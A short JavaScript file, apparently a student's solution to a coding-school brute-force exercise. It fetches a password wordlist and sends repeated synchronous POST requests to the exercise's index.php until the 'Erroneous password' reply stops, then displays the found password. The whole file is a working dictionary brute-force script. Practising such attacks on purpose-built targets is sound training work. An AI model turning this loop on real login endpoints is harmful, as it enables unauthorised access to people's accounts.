var dico;
var tabdico;
var rep;

function cool() {
    $.ajax({
        url: 'http://docusland.fr/code-academie/js_bruteforce/data/dico.txt', // l'url
        type: 'GET',
        dataType: 'text', // ce qu'on veut 
        success: function (result) {
            dico = result;
            tabdico = dico.split("\n");
        }

    });

};

function test() {
    var i = 0;
    var url = "http://docusland.fr/code-academie/js_bruteforce/index.php?password=";
    
   /* var password = "%22" + tabdico[i] + "%22";
        $.ajax({
            url: url + password, // l'url
            type: 'POST',
            dataType: 'text', // ce qu'on veut
            success: function (result) {
                rep = result;
                console.log(rep);
            }
        }).always(function(result, status, error){
            console.log("result");
            console.log(result);
            console.log("status");
            console.log(status);
            console.log("error");
            console.log(error);
        })
*/
    do {
        tabdico[i];
        i++;
        var password = "%22" + tabdico[i] + "%22";
        $.ajax({
            url: url + password, // l'url
            type: 'POST',
            dataType: 'text', // ce qu'on veut
            async : false ,
            complete: function (result) {
                rep = result.responseText ;
                console.log(rep);
                // n'attends pas que le sucess soit finit pour continuer donc pas de "resolu" solution?
            }
        }).always(function(result, status, error){
            console.log(result);
            console.log(status);
        })
    } while ( rep.match("Erroneous password") == "Erroneous password" )
    
    alert("le mdp est:" + tabdico[i]);
}
            
            //http://docusland.fr/code-academie/js_bruteforce/index.php?password=

